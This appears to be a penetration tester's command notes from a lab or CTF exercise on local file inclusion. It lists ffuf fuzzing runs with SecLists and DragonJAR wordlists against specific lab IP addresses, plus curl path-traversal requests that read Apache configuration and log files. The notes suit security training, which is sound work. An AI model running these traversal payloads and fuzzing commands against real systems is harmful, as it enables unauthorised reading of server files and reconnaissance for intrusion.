- git clone https://github.com/danielmiessler/SecLists
- https://github.com/DragonJAR/Security-Wordlist
- https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Fuzzing/LFI/LFI-Jhaddix.txt
- 154.57.164.82:30943 | http://154.57.164.82:30943
- ffuf -w https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://154.57.164.82:30943/index.php?FUZZ=value' -fs 2287

- wget -qO LFI-Jhaddix.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt && ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://154.57.164.82:30943/index.php?FUZZ=value' -fs 2287
- ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://154.57.164.82:30943/index.php?FUZZ=value' -mc 200 -fs 2309


- wget -qO default-web-root-directory-linux.txt https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/default-web-root-directory-linux.txt && ffuf -w default-web-root-directory-linux.txt:FUZZ -u 'http://154.57.164.82:30943/index.php?language=../../../../FUZZ/index.php' -fs 2287

- wget -qO LFI-WordList-Linux https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux && ffuf -w LFI-WordList-Linux:FUZZ -u 'http://154.57.164.82:30943/index.php?language=../../../../FUZZ' -fs 2287

- ffuf -w LFI-Jhaddix.txt:FUZZ -u "http://154.57.164.82:30943/index.php?language=FUZZ" -fs 2309

- curl "http://154.57.164.82:30943/index.php?language=../../../../etc/apache2/envvars"
- curl "http://154.57.164.82:30943/index.php?language=../../../../apache2/logs/access.log"
- curl "http://154.57.164.82:30943/index.php?language=../../../../etc/apache2/apache2.conf"
- ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://154.57.164.82:30943/index.php?language=../../../../FUZZ' -mc 200 -fs 2309
- ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://154.57.164.82:30943/index.php?language=../../../../FUZZ' -mc 200 -fw 571
- ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://154.57.164.82:30943/index.php?language=../../../../FUZZ' -mc 200 -fs 2309 -fw 571

- ffuf -w LFI-WordList-Linux:FUZZ -u 'http://154.57.164.82:30943/index.php?language=../../../../FUZZ' -mc 200 -fw 571
- ffuf -w LFI-WordList-Linux:FUZZ -u 'http://154.57.164.82:30943/index.php?language=../../../../FUZZ' -mc 200 -fs 2309

- ffuf -w LFI-WordList-Linux:FUZZ -u 'http://154.57.164.82:30943/index.php?language=../../../../FUZZ' -mc 200 -fs 2287

- ffuf -w LFI-WordList-Linux:FUZZ -u 'http://154.57.164.82:30943/index.php?language=../../../../FUZZ' -mc 200 -fs 2309


- wget -qO burp-parameter-names.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt && ffuf -w burp-parameter-names.txt:FUZZ -u 'http://154.57.164.82:30943/index.php?FUZZ=value' -fs 2309

- ffuf -w burp-parameter-names.txt:FUZZ -u "http://46.101.82.246:30730/index.php?FUZZ=value" -fs 2309
- ffuf -w burp-parameter-names.txt:FUZZ -u "http://46.101.82.246:30730/index.php?view=FUZZ" -fs 1935
- ffuf -w LFI-Jhaddix.txt:FUZZ -u "http://46.101.82.246:30730/index.php?view=value" -fs 1935
- ffuf -w LFI-Jhaddix.txt:FUZZ -u "http://46.101.82.246:30730/index.php?view=FUZZ" -fs 1935

## Resources

- https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#file-inclusion-and-path-traversal 
- https://github.com/D35m0nd142/LFISuite
- https://github.com/OsandaMalith/LFiFreak
- https://github.com/mzfr/liffy